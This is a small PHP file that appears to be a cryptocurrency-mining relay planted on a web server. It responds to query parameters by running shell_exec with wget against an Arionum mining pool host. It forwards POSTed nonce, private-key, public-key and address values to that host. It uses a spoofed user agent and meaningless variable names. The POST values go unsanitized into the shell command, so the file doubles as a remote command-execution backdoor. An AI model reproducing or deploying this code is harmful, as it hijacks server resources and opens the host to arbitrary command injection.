<?php

if($_GET["q"] == "")
  
{

echo "linux84";

}

if($_GET["work"] == "workjob")
  
{

echo shell_exec("wget -U 'Mozille84' -O ./linux84 http://mine.arionumpool.com/mine.php?q=info;cat ./linux84");

}

if($_GET["work"] == "job")
  
{

$google84741 = $_POST["argon"];

$google84742 = $_POST["nonce"];

$google84744 = $_POST["private_key"];

$google847412 = $_POST["public_key"];

$google847446 = $_POST["address"];

echo shell_exec("wget -O- --post-data=argon=" . $google84741 . "&nonce=" . $google84742 . "&private_key=" . $google84744 . "&public_key=" . $google847412 . "&address=" . $google847446 . " \ --header='Content-type: application/x-www-form-urlencoded' \ 'http://mine.arionumpool.com/mine.php?q=submitNonce');

}

?>
